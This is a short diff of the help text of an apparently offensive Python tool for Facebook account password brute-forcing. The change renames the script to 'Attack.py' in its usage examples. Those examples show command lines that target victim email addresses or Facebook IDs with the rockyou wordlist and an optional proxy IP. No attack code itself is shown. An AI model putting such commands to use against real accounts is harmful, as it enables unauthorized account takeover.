@@ -228,15 +228,15 @@ OPTIONS:
 Examples:
         |
      |--------
-     | python facebom.py -t victim@gmail.com -w /usr/share/wordlists/rockyou.txt
+     | python Attack.py -t victim@gmail.com -w /usr/share/wordlists/rockyou.txt
      |--------
-     | python Facebom.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
+     | python Attack.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
      |--------
-     | python facebom.py -t victim@hotmail.com -w D:\\wordlist.txt -p 35.236.37.121 default(port=8080,80) 
+     | python Attack.py -t victim@hotmail.com -w D:\\wordlist.txt -p 35.236.37.121 default(port=8080,80) 
      |--------
-     | python facebom.py -t victim@gmail.com -s 1234567
+     | python Attack.py -t victim@gmail.com -s 1234567
      |-------- 
-     | python facebom.py -g https://www.facebook.com/alanwalker97 
+     | python Attack.py -g https://www.facebook.com/lovehacker 
      |-------- 
 """)
 def Main():
